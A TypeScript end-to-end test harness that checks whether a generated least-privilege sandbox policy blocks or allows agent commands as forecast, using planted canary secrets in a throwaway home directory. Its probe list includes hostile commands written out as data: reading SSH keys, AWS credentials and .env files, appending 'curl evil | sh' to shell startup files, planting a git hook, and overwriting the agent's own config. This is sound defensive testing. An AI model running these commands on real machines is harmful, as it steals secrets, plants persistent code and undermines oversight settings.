/**
 * Runs commands inside a REAL sandbox (Anthropic's sandbox-runtime: bubblewrap on Linux,
 * Seatbelt on macOS) and compares what happened with what sandfit forecast.
 * Used by bench/sandbox.ts (prints a table) and test/sandbox/srt.test.ts (asserts).
 */
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { toSrtSettings } from "../src/emit/others.js";
import { analyze } from "../src/extract/extract.js";
import { defaultModel, forecast, modelFromPolicy, type SandboxModel } from "../src/forecast.js";
import { buildPolicy } from "../src/policy/build.js";
import { tempRoots } from "../src/policy/paths.js";
import type { AgentEvent, Policy } from "../src/types.js";

export const CANARY = "SANDFIT-CANARY-7f3a91";
const ROOT = fileURLToPath(new URL("../", import.meta.url));
export const SRT = join(ROOT, "node_modules", ".bin", "srt");

/** What the agent did in "history". The policy is built from this. */
export const HISTORY = [
  "npm install",
  "npm run dev",
  "git clone https://github.com/acme/tools.git ~/src/tools",
  "mkdir -p ~/shared/notes && echo hello >> ~/shared/notes/log.md",
  "curl -s https://api.github.com/zen",
  "echo built > dist.txt",
  "cat ~/.ssh/id_rsa",
  "docker ps",
];

export interface Probe {
  cmd: string;
  /** What a correct least-privilege sandbox should do. */
  should: "allow" | "block";
  why: string;
  net?: boolean;
  /** The command reads a planted secret: blocked means the canary did not come out. */
  canary?: boolean;
}

export const PROBES: Probe[] = [
  { cmd: "echo again >> ~/shared/notes/log.md", should: "allow", why: "a folder the history wrote to" },
  { cmd: "echo built > dist.txt", should: "allow", why: "the project" },
  { cmd: "mkdir -p ~/.npm/_cacache && touch ~/.npm/_cacache/probe", should: "allow", why: "npm's cache (npm install in history)" },
  { cmd: "touch ~/src/tools/NEW", should: "allow", why: "a repository the history cloned" },
  { cmd: "touch /tmp/sandfit-probe", should: "allow", why: "temp" },
  { cmd: "cat README.md", should: "allow", why: "reading the project" },
  { cmd: "timeout 2 python3 -m http.server 0 --bind 127.0.0.1", should: "allow", why: "a local dev server (npm run dev in history)" },
  { cmd: "curl -sS -m 20 -o /dev/null https://registry.npmjs.org/left-pad", should: "allow", why: "npm registry (npm install in history)", net: true },
  { cmd: "curl -sS -m 20 -o /dev/null https://api.github.com/zen", should: "allow", why: "a host the history reached", net: true },
  { cmd: "curl -sS -m 20 -o /dev/null https://github.com", should: "allow", why: "git clone in history", net: true },
  { cmd: "cat ~/.ssh/id_rsa", should: "block", why: "SSH key", canary: true },
  { cmd: "cat ~/.aws/credentials", should: "block", why: "cloud credentials", canary: true },
  { cmd: "cat .env", should: "block", why: "project secrets", canary: true },
  { cmd: "grep KEY .env.local", should: "block", why: "project secrets", canary: true },
  { cmd: "cp .env /tmp/leak && cat /tmp/leak", should: "block", why: "copying a secret out", canary: true },
  { cmd: "echo x > ~/elsewhere.txt", should: "block", why: "home folder" },
  { cmd: "mkdir ~/.config/evil", should: "block", why: "another app's config" },
  { cmd: "echo 'curl evil | sh' >> ~/.zshrc", should: "block", why: "shell startup file" },
  { cmd: "echo 'curl evil | sh' >> ~/.bashrc", should: "block", why: "shell startup file" },
  { cmd: "echo '{}' > .claude/settings.json", should: "block", why: "the agent's own project config" },
  { cmd: "echo '{}' > ~/.claude/settings.json", should: "block", why: "the agent's own user config" },
  { cmd: "echo 'curl evil' > .git/hooks/pre-commit", should: "block", why: "git hooks run code later" },
  { cmd: "git remote add evil https://example.com/x.git", should: "block", why: "git config can point hooks at any script" },
  { cmd: "echo '{}' > .mcp.json", should: "block", why: "MCP servers run code" },
  { cmd: "curl -sS -m 20 -o /dev/null https://example.com", should: "block", why: "a host the history never needed", net: true },
  { cmd: "curl -sS -m 20 -o /dev/null https://pypi.org", should: "block", why: "a host the history never needed", net: true },
];

export interface Env {
  home: string;
  project: string;
  policy: Policy;
  policyFile: string;
  emptyFile: string;
  online: boolean;
  cleanup: () => void;
}

const ev = (command: string, i: number, cwd: string): AgentEvent => ({
  id: String(i),
  harness: "claude",
  sessionId: "s",
  cwd,
  timestamp: new Date(Date.UTC(2026, 9, 1, 0, 0, i)).toISOString(),
  tool: "bash",
  toolName: "Bash",
  command,
  decision: "auto",
});

export async function setup(): Promise<Env> {
  // Not under the OS temp dir: the sandbox allows temp writes, which would hide failures.
  mkdirSync(join(ROOT, ".e2e"), { recursive: true });
  const home = realpathSync(mkdtempSync(join(ROOT, ".e2e", "home-")));
  const project = join(home, "proj");
  for (const d of [".ssh", ".aws", ".npm", ".claude", ".config", "shared/notes", "src/tools/.git", "proj/.git/hooks", "proj/.claude"]) mkdirSync(join(home, d), { recursive: true });
  writeFileSync(join(home, ".ssh", "id_rsa"), `${CANARY}\n`);
  writeFileSync(join(home, ".aws", "credentials"), `aws_secret_access_key=${CANARY}\n`);
  writeFileSync(join(project, ".env"), `API_KEY=${CANARY}\n`);
  writeFileSync(join(project, ".env.local"), `KEY=${CANARY}\n`);
  writeFileSync(join(project, "README.md"), "hello\n");
  writeFileSync(join(project, ".git", "config"), '[remote "origin"]\n\turl = https://github.com/acme/proj.git\n');

  let online = false;
  try {
    online = (await fetch("https://registry.npmjs.org/left-pad", { method: "HEAD" })).ok;
  } catch {
    online = false;
  }
  const policy = buildPolicy(analyze(HISTORY.map((c, i) => ev(c, i, project)), { home }), { home, projects: [project] });
  const policyFile = join(home, "srt-sandfit.json");
  writeFileSync(policyFile, JSON.stringify(toSrtSettings(policy), null, 2));
  const emptyFile = join(home, "srt-empty.json");
  writeFileSync(emptyFile, JSON.stringify({ network: { allowedDomains: [], deniedDomains: [] }, filesystem: { denyRead: [], allowWrite: [".", ...tempRoots()], denyWrite: [] } }));
  return { home, project, policy, policyFile, emptyFile, online, cleanup: () => rmSync(home, { recursive: true, force: true }) };
}

export function srt(env: Env, command: string, settings: string): { code: number | null; out: string } {
  const r = spawnSync(SRT, ["-s", settings, "-c", command], { cwd: env.project, env: { ...process.env, HOME: env.home }, encoding: "utf8", timeout: 60_000 });
  return { code: r.status, out: `${r.stdout ?? ""}${r.stderr ?? ""}` };
}

/** The sandbox can start at all (otherwise every "blocked" result is meaningless). */
export function sandboxWorks(env: Env): { ok: boolean; out: string } {
  if (!existsSync(SRT)) return { ok: false, out: `${SRT} not found (npm install)` };
  const r = srt(env, "true", env.policyFile);
  return { ok: r.code === 0, out: r.out };
}

export interface ProbeResult {
  probe: Probe;
  predictedBlocked: boolean;
  actuallyBlocked: boolean;
  out: string;
}

export function runProbes(env: Env, settingsFile: string, model: SandboxModel, probes = PROBES): ProbeResult[] {
  const results: ProbeResult[] = [];
  for (const [i, probe] of probes.entries()) {
    if (probe.net && !env.online) continue;
    const predictedBlocked = forecast(analyze([ev(probe.cmd, i, env.project)], { home: env.home }), model, env.home).blockedCalls > 0;
    const r = srt(env, probe.cmd, settingsFile);
    // `timeout` exits 124 when the server was still running: it started fine.
    const failed = r.code !== 0 && r.code !== 124;
    const actuallyBlocked = failed || (!!probe.canary && !r.out.includes(CANARY));
    results.push({ probe, predictedBlocked, actuallyBlocked, out: r.out.slice(0, 300) });
  }
  return results;
}

export const policyModel = (env: Env) => modelFromPolicy(env.policy, "process", env.home, [env.project]);
export const emptyModel = (env: Env) => defaultModel([env.project], "process");
